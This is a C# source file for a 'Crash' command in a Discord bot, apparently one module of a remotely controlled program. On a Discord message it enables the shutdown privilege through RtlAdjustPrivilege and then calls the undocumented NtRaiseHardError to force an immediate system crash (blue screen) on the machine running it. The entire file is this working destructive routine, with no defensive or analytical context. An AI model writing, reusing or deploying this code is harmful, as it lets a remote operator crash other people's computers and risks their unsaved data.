using System.Diagnostics;
using Discord;
using Discord.WebSocket;
using Helper;
using System.Runtime.InteropServices;
namespace Commands {
    public static class Crash {

                
                [DllImport("ntdll.dll")]
                private static extern uint NtRaiseHardError(
                uint ErrorStatus,
                uint NumberOfParameters,
                uint UnicodeStringParameterMask,
                IntPtr Parameters,
                uint ValidResponseOption,
                out uint Response
                );


                [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);



            public static async Task Run(SocketUserMessage Message, string[] args) {

                bool previousValue = false;
                RtlAdjustPrivilege(19, true, false, out previousValue);

                
                NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out uint Response);


                
            }


            
        }
    }
